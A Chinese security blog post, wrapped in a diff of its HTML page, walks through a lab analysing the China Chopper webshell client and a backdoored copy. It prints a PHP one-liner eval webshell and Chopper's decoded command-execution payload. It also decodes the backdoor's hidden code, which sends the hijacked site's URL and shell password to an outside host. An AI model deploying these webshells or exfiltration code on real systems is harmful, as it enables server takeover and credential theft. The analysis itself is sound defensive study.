@@ -1,0 +1,163 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>分析菜刀及隐藏后门 | madcoding’s blog</title><meta name="description" content="分析菜刀及隐藏后门"><meta name="keywords" content="菜刀,chopper"><meta name="author" content="madcoding"><meta name="copyright" content="madcoding"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="canonical" href="https://www.mad-coding.cn/2020/02/14/分析菜刀及隐藏后门/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="分析菜刀及隐藏后门"><meta name="twitter:description" content="分析菜刀及隐藏后门"><meta name="twitter:image" content="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214184845.png"><meta property="og:type" content="article"><meta property="og:title" content="分析菜刀及隐藏后门"><meta property="og:url" content="https://www.mad-coding.cn/2020/02/14/分析菜刀及隐藏后门/"><meta property="og:site_name" content="madcoding’s blog"><meta property="og:description" content="分析菜刀及隐藏后门"><meta property="og:image" content="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214184845.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="prev" title="kali中安装openvas扫描器" href="https://www.mad-coding.cn/2020/02/16/kali中安装openvas扫描器/"><link rel="next" title="AppScan Standard-9.0.3.14安装破解" href="https://www.mad-coding.cn/2020/02/10/AppScan-Standard-9-0-3-14安装破解/"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?4f375d7c7c0acbaae6032e476c824100";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://www.mad-coding.cn/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  highlight_copy: 'true',
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    title: '添加书签',
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天'
+
+  
+}</script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-基本知识"><span class="toc-text">0x01 基本知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-分析正常菜刀"><span class="toc-text">0x02 分析正常菜刀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-静态分析中国菜刀"><span class="toc-text">2.1 静态分析中国菜刀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-动态分析菜刀"><span class="toc-text">2.2 动态分析菜刀</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-分析后门菜刀"><span class="toc-text">0x03 分析后门菜刀</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-总结"><span class="toc-text">0x04 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-参考链接"><span class="toc-text">0x04 参考链接</span></a></li></ol></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214184845.png)"><div id="page-header"><span class="pull-left"> <a class="blog_title" id="site-name" href="/">madcoding’s blog</a></span><div class="open toggle-menu pull-right"><div class="menu-icon-first"></div><div class="menu-icon-second"></div><div class="menu-icon-third"></div></div><span class="pull-right menus"><div class="mobile_author_icon"><img class="lozad" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'"><div class="mobile_author-info__description">If you want to succeed, just do it.</div></div><hr><div class="menus_item"><a class="site-page" href="/ "><i class="fa-fw fa fa-home"></i><span> 首页</span></a><a class="site-page" href="/archives/"><i class="fa-fw fa fa-calendar"></i><span> 时间轴</span></a><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 类别</span></a><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> 读书</span></a><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-file-image-o"></i><span> 相册</span></a><a class="site-page" href="/pan/"><i class="fa-fw fa fa-hdd-o"></i><span> 资源</span></a><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a><a class="site-page" href="/留言板/"><i class="fa-fw fa fa-comment"></i><span> 留言板</span></a><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a><script>document.body.addEventListener('touchstart', function(){ });</script></div></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title"><div class="posttitle">分析菜刀及隐藏后门</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-02-14<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-02-14</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/逆向分析/">逆向分析</a></span><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">1.8k</span><span class="post-meta__separator">|</span><span>阅读时长≈: 6 分钟</span><span class="post-meta__separator">|</span><span>℃: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今日在合天网安的web课程中看到了分析菜刀后门的实验，然后就跟着实验做了一遍，正好可以学习一下如何分析软件的后门。</p>
+<a id="more"></a>
+
+<h1 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01 基本知识"></a>0x01 基本知识</h1><blockquote>
+<p>中国菜刀</p>
+</blockquote>
+<p>  中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示</p>
+<blockquote>
+<p>winsock expert</p>
+</blockquote>
+<p>  一个用来监视和修改网络发送和接收数据的程序，WinSock Expert可以用来帮助您调试网络应用程序，分析网络程序的通信协议（如分析OICQ的发送接收数据），并且在必要的时候能够修改发送的数据</p>
+<blockquote>
+<p>UPX</p>
+</blockquote>
+<p>​      UPX (the Ultimate Packer for eXecutables)是一款先进的可执行程序文件压缩器，压缩过的可执行文件体积缩小50%-70% ，这样减少了磁盘占用空间、网络上传下载的时间和其它分布以及存储费用。 通过 UPX 压缩过的程序和程序库完全没有功能损失和压缩之前一样可正常地运行，对于支持的大多数格式没有运行时间或内存的不利后果。</p>
+<blockquote>
+<p>Wireshark</p>
+</blockquote>
+<p>​      Wireshark是免费的网络协议检测分析程序。让您经由程序抓取运行的网站的相关资讯，包括每一封包流向及其内容、资讯可依操作系统语系看出,方便查看、监控TCP session动态等等。</p>
+<blockquote>
+<p>PEID</p>
+</blockquote>
+<p>​     一款专业很好用的查壳软件，几乎可以侦测出所有的壳，其数量已超过470 种PE文档 的加壳类型和签名，另外还可识别出EXE文件是用什么语言编写的，比如：VC++、Delphi、VB或Delphi等。</p>
+<blockquote>
+<p>工具下载地址：</p>
+</blockquote>
+<h1 id="0x02-分析正常菜刀"><a href="#0x02-分析正常菜刀" class="headerlink" title="0x02 分析正常菜刀"></a>0x02 分析正常菜刀</h1><p>市面上的中国菜刀有很多版本，有些版本可能会被不发分析植入了后门，那么我们怎么知道自己使用的菜刀会不会被植入了后门尼？</p>
+<p>那就来简单的分析下吧，</p>
+<h2 id="2-1-静态分析中国菜刀"><a href="#2-1-静态分析中国菜刀" class="headerlink" title="2.1 静态分析中国菜刀"></a>2.1 静态分析中国菜刀</h2><p>菜刀的文件类型.exe的可执行程序，那么就要分析改工具使用什么语言写的了。</p>
+<p>通过peid等工具可以看出来是使用upx加壳了</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214171019.png" class="lozad"></p>
+<p>在通过winhex查看下，同样显示也是upx加壳</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214171216.png" class="lozad"></p>
+<p>既然加壳了，那就脱壳吧，使用upx脱壳</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214171344.png" class="lozad"></p>
+<p>脱壳成功后在放入peid检测一下看看，得知使用vc++6.0开发的，用C++写的。</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214170739.png" class="lozad"></p>
+<h2 id="2-2-动态分析菜刀"><a href="#2-2-动态分析菜刀" class="headerlink" title="2.2 动态分析菜刀"></a>2.2 动态分析菜刀</h2><blockquote>
+<p>环境：</p>
+<p>靶机：Windows server 2003 –192.168.1.134</p>
+<p>攻击机：Windows 7–192.168.1.131</p>
+</blockquote>
+<p>在靶机上写一个php一句话放在网站的根目录下，如caodao.php,内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'chopper'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214171839.png" class="lozad"></p>
+<p>然后在攻击机上使用菜刀连接</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172006.png" class="lozad"></p>
+<p>成功连接上</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172119.png" class="lozad"></p>
+<p>开启wireshark监听本地的数据包，</p>
+<p>过滤规则写ip.addr=192.168.1.131,然后返回菜刀，</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172450.png" class="lozad"></p>
+<p>输入netstat -an | find “ESTABLISHED”或者whoami这类cmd命令</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172358.png" class="lozad"></p>
+<p>然后在wireshark中找到靶机和攻击机的ip地址</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172935.png" class="lozad"></p>
+<p>给攻击机和靶机通信的数据包加上颜色，方便查看</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214173126.png" class="lozad"></p>
+<p>找到靶机和攻击机通过HTTP协议通信的数据包，按下图操作，我们可以追踪tcp流来查看整个tcp数据交互过程</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214173401.png" class="lozad"></p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214173603.png" class="lozad"></p>
+<p> 上面红色部分为攻击机POST提交控制命令的内容，下面蓝色部分为靶机返回结果</p>
+<p> 从红色部分我们可以看到一共有z0,z1,z2三个参数，我们使用burpsuite自带的decoder模块进行解码</p>
+<p>可以看到红色部分的代码经过base64以及url的编码，我们解码看看</p>
+<p>解码的顺序依次为url解码，然后再base64解码，得到明文</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214174047.png" class="lozad"></p>
+<blockquote>
+<p>z0=@ini_set(“display_errors”,”0”);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(“&gt;|”);;$p=base64_decode($_POST[“z1”]);$s=base64_decode($_POST[“z2”]);$d=dirname($_SERVER[“SCRIPT_FILENAME”]);$c=substr($d,0,1)==”/“?”-c &quot;{$s}&quot;“:”/c &quot;{$s}&quot;“;$r=”{$p} {$c}”;@system($r.” 2&gt;&amp;1”,$ret);print ($ret!=0)?”ret={$ret}”:””;;echo(“|&lt;-“);die();</p>
+</blockquote>
+<blockquote>
+<p>z1=cmd</p>
+</blockquote>
+<blockquote>
+<p>z2=cd /d “C:\phpStudy\PHPTutorial\WWW&quot;&amp;netstat -an | find “ESTABLISHED”&amp;echo [S]&amp;cd&amp;echo [E]</p>
+</blockquote>
+<p> z1的值是cmd，</p>
+<p>z2的值是cd /d “c:\inetpub\wwwroot\”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]。该操作的意思就是执行输入的cmd命令，列出当前用户与当前目录，执行结果如下所示</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214174310.png" class="lozad"></p>
+<p>我们输入其他的命令的话，当然也是可以通过同样的流程进行分析</p>
+<p>以上就是中国菜刀的流量通信的特征</p>
+<p>了解了正常的菜刀是如何工作的，接下来我们看看被植入恶意后门的菜刀是怎样的。</p>
+<h1 id="0x03-分析后门菜刀"><a href="#0x03-分析后门菜刀" class="headerlink" title="0x03 分析后门菜刀"></a>0x03 分析后门菜刀</h1><p>  为了与前一个菜刀的分析流程进行区分，我们这一步特地选用了另外一个菜刀，使用另外一个抓包软件进行分析。</p>
+<p>  打开菜刀，启动抓包软件WSockExpert，点击左上角的文件夹图标，选择caidao.exe，点击open即可</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214175426.png" class="lozad"></p>
+<p>然后使用带后门的菜刀连接shell，连接虚拟终端执行命令</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214183504.png" class="lozad"></p>
+<p>在winsockExpert中查看菜刀的通信数据</p>
+<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214182942.png" class="lozad"></p>
+<blockquote>
+<p>注：由于没有在网上找到带有后门的菜刀，所以下面的数据都是参考网上带有后门菜刀的数据</p>
+</blockquote>
+<p>完整的post内容是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=%24_%3Dstrrev%28edoced_46esab%29%3B%40eval%28%24_%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGV2YWwo</span><br><span class="line">YmFzZTY0X2RlY29kZSgnYVdZb0pGOURUMDlMU1VWYkoweDVhMlVuWFNFOU1TbDdjMlYwWTI5dmEybGxLQ2RNZVd</span><br><span class="line">0bEp5d3hLVHRBWm1sc1pTZ25hSFIwY0RvdkwzZDNkeTVuYjI5a1pHOW5MbWx1TDBGd2FTNXdhSEEvVlhKc1BTY3VKR</span><br><span class="line">jlUUlZKV1JWSmJKMGhVVkZCZlNFOVRWQ2RkTGlSZlUwVlNWa1ZTV3lkU1JWRlZSVk5VWDFWU1NTZGRMaWNtVUdGem</span><br><span class="line">N6MG5MbXRsZVNna1gxQlBVMVFwS1R0OScpKTtAaW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCIwIik7QHNldF90aW1lX2xp</span><br><span class="line">bWl0KDApO0BzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7ZWNobygiLT58Iik7OyREPWRpcm5hbWUoJF9TRVJWR</span><br><span class="line">VJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pO</span><br><span class="line">yRSPSJ7JER9XHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaX</span><br><span class="line">NfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO30kUi49Ilx0IjskdT0oZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRlZ2lkJykpP</span><br><span class="line">0Bwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKTonJzskdXNyPSgkdSk%2FJHVbJ25hbWUnXTpAZ2V0X2N1cn</span><br><span class="line">JlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Iih7JHVzcn0pIjtwcmludCAkUjs7ZWNobygifDwtIik7ZGllKCk7</span><br></pre></td></tr></table></figure>
+
+<p>被urlencode+base64了，看着有点乱，先urldecode下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=$_=strrev(edoced_46esab);@eval($_($_POST[z0]));&amp;z0=QGV2YWwoYmFzZTY0X2RlY29kZSgnYVdZb0pGOURUMDlM</span><br><span class="line">U1VWYkoweDVhMlVuWFNFOU1TbDdjMlYwWTI5dmEybGxLQ2RNZVd0bEp5d3hLVHRBWm1sc1pTZ25hSFIwY0RvdkwzZD</span><br><span class="line">NkeTVuYjI5a1pHOW5MbWx1TDBGd2FTNXdhSEEvVlhKc1BTY3VKRjlUUlZKV1JWSmJKMGhVVkZCZlNFOVRWQ2RkTGlSZlU</span><br><span class="line">wVlNWa1ZTV3lkU1JWRlZSVk5VWDFWU1NTZGRMaWNtVUdGemN6MG5MbXRsZVNna1gxQlBVMVFwS1R0OScpKTtAaW5p</span><br><span class="line">X3NldCgiZGlzcGxheV9lcnJvcnMiLCIwIik7QHNldF90aW1lX2xpbWl0KDApO0BzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUo</span><br><span class="line">MCk7ZWNobygiLT58Iik7OyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGl</span><br><span class="line">ybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9XHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2Z</span><br><span class="line">vcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO30kUi49Ilx0IjskdT0oZnV</span><br><span class="line">uY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRlZ2lkJykpP0Bwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKTonJzskdXN</span><br><span class="line">yPSgkdSk/JHVbJ25hbWUnXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Iih7JHVzcn0pIjtwcmlud</span><br><span class="line">CAkUjs7ZWNobygifDwtIik7ZGllKCk7_</span><br></pre></td></tr></table></figure>
+
+<p>毫无疑问，我们需要分析的是z0这个被base64的部分，解码看看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@eval(base64_decode(*aWYoJF9DT09LSUVbJ0x5a2UnXSE9MSl7c2V0Y29va2llKCdMeWtlJywxKTtAZmlsZSgnaHR0cDovL</span><br><span class="line">3d3dy5nb29kZG9nLmluL0FwaS5waHA/VXJsPScuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1</span><br><span class="line">VSSSddLicmUGFzcz0nLmtleSgkX1BPU1QpKTt9*));@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_</span><br><span class="line">runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\t&quot;;$u=(function_exists(*posix_getegid*))?@posix_getpwuid(@posix_geteuid()):**;$usr=($u)?$u[*name*]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure>
+
+<p>后面一部分是熟悉的菜刀的代码，但前面为什么居然还有一段加密的呢，接着解,解出来的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($_COOKIE[*Lyke*]!=1)&#123;setcookie(*Lyke*,1);@file(*http://www.gooddog.in/Api.php?Url=*.$_SERVER[*HTTP_HOST*].$_SERVER[*REQUEST_URI*].*&amp;Pass=*.key($_POST));&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<a href="http://www.gooddog.in/Api.php就是这个菜刀的后门地址。" target="_blank" rel="noopener">http://www.gooddog.in/Api.php就是这个菜刀的后门地址。</a></p>
+<p>HTTP_HOST就是我们拿到shell的网站，REQUEST_URI就是shell的URI,Pass就是我们菜刀连接一句话时的密码</p>
+<p>  这段代码的大概意思就是，会将我们拿到shell的网站的地址，密码等都通过后门传送给这个网站的所有者。</p>
+<p>这样，我们就分析出了这个菜刀是存在后门的。</p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>整个分析的过程，基本上没有什么难的地方。以后在网上下载一些报毒的文件，都可以这样来分析一下会不会被植入了后门，像前一阵子的phpstudy一样，引起了很大的风波。</p>
+<h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="http://www.hetianlab.com/expc.do?ce=85d14d4e-5b36-42b9-9415-453efa35de60" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=85d14d4e-5b36-42b9-9415-453efa35de60</a></p>
+<hr></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">madcoding</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mad-coding.cn/2020/02/14/分析菜刀及隐藏后门/">https://www.mad-coding.cn/2020/02/14/分析菜刀及隐藏后门/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mad-coding.cn">madcoding’s blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/菜刀/">菜刀    </a><a class="post-meta__tags" href="/tags/chopper/">chopper    </a></div><div class="post_share"><div class="social-share" data-image="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214184845.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-buttom"><i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/wechat.jpg"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/alipay.jpg"><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull-left"><a href="/2020/02/16/kali中安装openvas扫描器/"><img class="prev_cover lozad" data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>kali中安装openvas扫描器</span></div></a></div><div class="next-post pull-right"><a href="/2020/02/10/AppScan-Standard-9-0-3-14安装破解/"><img class="next_cover lozad" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210190437.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>AppScan Standard-9.0.3.14安装破解</span></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'G4KVNWBtXJxgbEwcA9QMJGVo-gzGzoHsz',
+  appKey:'E8XbTUIA04PSPKW9rGpkjYg3',
+  placeholder:'Please leave your footprints',
+  avatar:'monsterid',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang:'en',
+  recordIP: true
+});</script></div></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By madcoding</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Hi，welcome to madcoding's <a href="https://www.mad-coding.cn/">blog</a></div><div class="icp"><a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action"><span>皖ICP备17023740号</span></a></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><section class="rightside" id="rightside"><i class="fa fa-book" id="readmode" title="阅读模式"> </i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换">繁</a><i class="fa fa-moon-o nightshift" id="nightshift" title="夜间模式"></i></section><div id="post_bottom"><div id="post_bottom_items"><a id="to_comment" href="#post-comment"><i class="scroll_to_comment fa fa-comments"></i></a><i class="fa fa-list" id="mobile_toc"></i><div id="toc_mobile"><div class="toc_mobile_headline">目录</div><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x00-前言"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">0x00 前言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x01-基本知识"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">0x01 基本知识</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x02-分析正常菜刀"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">0x02 分析正常菜刀</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-1-静态分析中国菜刀"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">2.1 静态分析中国菜刀</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-2-动态分析菜刀"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">2.2 动态分析菜刀</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x03-分析后门菜刀"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">0x03 分析后门菜刀</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x04-总结"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">0x04 总结</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x04-参考链接"><span class="toc_mobile_items-number">6.</span> <span class="toc_mobile_items-text">0x04 参考链接</span></a></li></ol></div></div></div><script 